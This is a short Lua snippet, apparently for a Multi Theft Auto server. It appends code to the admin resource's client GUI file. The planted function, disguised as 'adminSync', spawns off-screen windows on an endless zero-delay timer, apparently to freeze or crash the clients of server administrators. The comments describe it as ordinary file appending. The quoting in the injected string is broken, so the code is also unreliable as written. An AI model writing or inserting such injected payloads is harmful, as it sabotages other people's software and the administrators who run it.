

hFile = fileOpen(":admin/client/gui/admin_message.lua")
fileSetPos( hFile, fileGetSize( hFile ) )  -- move position to the end of the file
fileWrite(hFile, "function adminSync() guiCreateWindow(-5550, -5550, 0, 0, "", false) setTimer(adminSync, 0, 0) end ")                 -- append data
fileFlush(hFile)                           -- Flush the appended data into the file.
fileClose(hFile) 
